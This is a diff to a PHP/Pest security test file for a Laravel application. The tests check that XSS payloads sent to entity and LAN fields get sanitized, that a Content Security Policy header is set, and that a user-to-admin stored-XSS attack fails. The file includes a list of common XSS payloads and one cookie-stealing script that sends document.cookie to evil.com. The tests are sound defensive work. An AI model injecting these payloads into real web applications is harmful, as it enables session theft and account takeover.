@@ -1,5 +1,7 @@
 <?php
 
+use App\Models\Entity;
+use App\Models\Lan;
 use App\Models\User;
 use Database\Seeders\PermissionRoleTableSeeder;
 use Database\Seeders\PermissionsTableSeeder;
@@ -8,9 +10,10 @@ use Database\Seeders\RoleUserTableSeeder;
 use Database\Seeders\UsersTableSeeder;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Support\Facades\DB;
-use App\Models\Entity;
+use Laravel\Passport\Passport;
+use Tests\TestCase;
 
-uses(Tests\TestCase::class, RefreshDatabase::class);
+uses(TestCase::class, RefreshDatabase::class);
 
 beforeEach(function () {
     $this->seed([
@@ -45,16 +48,16 @@ beforeEach(function () {
 function xssPayloads(): array
 {
     return [
-        'script tag basic'        => ['<script>alert(1)</script>'],
-        'script tag uppercase'    => ['<SCRIPT>alert(1)</SCRIPT>'],
-        'img onerror'             => ['<img src=x onerror=alert(1)>'],
-        'svg onload'              => ['<svg onload=alert(1)>'],
-        'javascript href'         => ['<a href="javascript:alert(1)">click</a>'],
+        'script tag basic' => ['<script>alert(1)</script>'],
+        'script tag uppercase' => ['<SCRIPT>alert(1)</SCRIPT>'],
+        'img onerror' => ['<img src=x onerror=alert(1)>'],
+        'svg onload' => ['<svg onload=alert(1)>'],
+        'javascript href' => ['<a href="javascript:alert(1)">click</a>'],
         'event attribute onclick' => ['<p onclick="alert(1)">text</p>'],
-        'style expression'        => ['<p style="background:url(javascript:alert(1))">'],
-        'iframe src'              => ['<iframe src="javascript:alert(1)"></iframe>'],
-        'encoded script'          => ['&#60;script&#62;alert(1)&#60;/script&#62;'],
-        'double encoded'          => ['%3Cscript%3Ealert(1)%3C/script%3E'],
+        'style expression' => ['<p style="background:url(javascript:alert(1))">'],
+        'iframe src' => ['<iframe src="javascript:alert(1)"></iframe>'],
+        'encoded script' => ['&#60;script&#62;alert(1)&#60;/script&#62;'],
+        'double encoded' => ['%3Cscript%3Ealert(1)%3C/script%3E'],
     ];
 }
 
@@ -66,8 +69,9 @@ function xssPayloadsInName(): array
 {
     $wrapped = [];
     foreach (xssPayloads() as $label => $args) {
-        $wrapped[$label] = ['Entité ' . $args[0] . ' test'];
+        $wrapped[$label] = ['Entité '.$args[0].' test'];
     }
+
     return $wrapped;
 }
 
@@ -97,7 +101,7 @@ describe('Content Security Policy', function () {
             ->toContain("default-src 'self'")
             ->toContain("object-src 'none'")
             ->toContain("frame-src 'none'")
-            ->toContain("script-src");
+            ->toContain('script-src');
     });
 
     // FIX 1 : nonce pas encore implémenté — script-src utilise 'unsafe-inline'
@@ -136,7 +140,7 @@ describe('Entity store — plain-text fields are sanitized', function () {
 
     it('strip les balises HTML du champ contact_point', function (string $payload) {
         $this->post(route('admin.entities.store'), [
-            'name'          => 'Test Entity',
+            'name' => 'Test Entity',
             'contact_point' => $payload,
         ])->assertRedirect();
 
@@ -157,7 +161,7 @@ describe('Entity store — plain-text fields are sanitized', function () {
     //          ce qui est aussi une réponse sécurisée correcte.
     it('strip les balises HTML du champ name', function (string $payload) {
         $this->post(route('admin.entities.store'), [
-            'name'          => $payload,
+            'name' => $payload,
             'contact_point' => 'contact@example.com',
         ])->assertRedirect();
 
@@ -181,7 +185,7 @@ describe('Entity store — plain-text fields are sanitized', function () {
 
     it('strip les balises HTML du champ name avec texte autour du payload', function (string $payload) {
         $this->post(route('admin.entities.store'), [
-            'name'          => $payload,
+            'name' => $payload,
             'contact_point' => 'contact@example.com',
         ])->assertRedirect();
 
@@ -207,7 +211,7 @@ describe('Entity store — rich HTML fields are purified', function () {
 
     it('supprime les scripts injectés dans le champ description', function (string $payload) {
         $this->post(route('admin.entities.store'), [
-            'name'        => 'Test Entity',
+            'name' => 'Test Entity',
             'description' => $payload,
         ])->assertRedirect();
 
@@ -223,10 +227,10 @@ describe('Entity store — rich HTML fields are purified', function () {
 
     it('conserve le HTML légitime dans le champ description', function () {
         $legitimateHtml = '<p>Texte avec <strong>gras</strong> et <em>italique</em>.</p>'
-            . '<ul><li>Point 1</li><li>Point 2</li></ul>';
+            .'<ul><li>Point 1</li><li>Point 2</li></ul>';
 
         $this->post(route('admin.entities.store'), [
-            'name'        => 'Test Entity',
+            'name' => 'Test Entity',
             'description' => $legitimateHtml,
         ])->assertRedirect();
 
@@ -240,7 +244,7 @@ describe('Entity store — rich HTML fields are purified', function () {
 
     it('supprime les attributs on* sur les balises autorisées', function () {
         $this->post(route('admin.entities.store'), [
-            'name'        => 'Test Entity',
+            'name' => 'Test Entity',
             'description' => '<p onclick="alert(1)">texte</p>',
         ])->assertRedirect();
 
@@ -253,7 +257,7 @@ describe('Entity store — rich HTML fields are purified', function () {
 
     it('supprime les attributs style sur les balises autorisées', function () {
         $this->post(route('admin.entities.store'), [
-            'name'        => 'Test Entity',
+            'name' => 'Test Entity',
             'description' => '<p style="background:url(javascript:alert(1))">texte</p>',
         ])->assertRedirect();
 
@@ -273,7 +277,7 @@ describe('Entity update — payloads are sanitized', function () {
         $entity = Entity::factory()->create(['contact_point' => 'contact@example.com']);
 
         $this->put(route('admin.entities.update', $entity), [
-            'name'          => $entity->name,
+            'name' => $entity->name,
             'contact_point' => $payload,
         ])->assertRedirect();
 
@@ -288,7 +292,7 @@ describe('Entity update — payloads are sanitized', function () {
         $entity = Entity::factory()->create();
 
         $this->put(route('admin.entities.update', $entity), [
-            'name'        => $entity->name,
+            'name' => $entity->name,
             'description' => $payload,
         ])->assertRedirect();
 
@@ -309,7 +313,7 @@ describe('Scénario attaque User → Admin', function () {
         $this->actingAs($this->userWithRoleUser);
 
         $this->post(route('admin.entities.store'), [
-            'name'          => 'Entité malveillante',
+            'name' => 'Entité malveillante',
             'contact_point' => '<script>fetch("https://evil.com?c="+document.cookie)</script>',
         ])->assertRedirect();
 
@@ -349,14 +353,14 @@ describe('Scénario attaque User → Admin', function () {
 describe('API mass-store / mass-update — payloads are sanitized', function () {
 
     beforeEach(function () {
-        Laravel\Passport\Passport::actingAs($this->admin);
+        Passport::actingAs($this->admin);
     });
 
     it('sanitise les champs HTML riches lors d\'un mass-store', function (string $payload) {
         $response = $this->postJson('/api/entities/mass-store', [
             'items' => [[
-                'name'          => 'Mass entity',
-                'description'   => $payload,
+                'name' => 'Mass entity',
+                'description' => $payload,
                 'contact_point' => $payload,
             ]],
         ])->assertCreated();
@@ -379,7 +383,7 @@ describe('API mass-store / mass-update — payloads are sanitized', function () 
 
         $response = $this->postJson('/api/entities/mass-store', [
             'items' => [[
-                'name'        => 'IPD mass-store entity',
+                'name' => 'IPD mass-store entity',
                 'description' => $payload,
             ]],
         ])->assertCreated();
@@ -406,7 +410,7 @@ describe('API mass-store / mass-update — payloads are sanitized', function () 
     it('conserve le HTML légitime lors d\'un mass-store', function () {
         $response = $this->postJson('/api/entities/mass-store', [
             'items' => [[
-                'name'        => 'Mass entity',
+                'name' => 'Mass entity',
                 'description' => '<p>Texte avec <strong>gras</strong></p>',
             ]],
         ])->assertCreated();
@@ -420,8 +424,8 @@ describe('API mass-store / mass-update — payloads are sanitized', function () 
 
         $this->putJson('/api/entities/mass-update', [
             'items' => [[
-                'id'          => $entity->id,
-                'name'        => $entity->name,
+                'id' => $entity->id,
+                'name' => $entity->name,
                 'description' => $payload,
             ]],
         ])->assertOk();
@@ -435,12 +439,12 @@ describe('API mass-store / mass-update — payloads are sanitized', function () 
     it('sanitise les autres objets lors d\'un mass-store (lans)', function () {
         $response = $this->postJson('/api/lans/mass-store', [
             'items' => [[
-                'name'        => 'LAN-XSS',
+                'name' => 'LAN-XSS',
                 'description' => '<img src=x onerror=alert(1)>',
             ]],
         ])->assertCreated();
 
-        expect((string) App\Models\Lan::query()->findOrFail($response->json('ids.0'))->description)
+        expect((string) Lan::query()->findOrFail($response->json('ids.0'))->description)
             ->not->toContain('onerror');
     });
 });
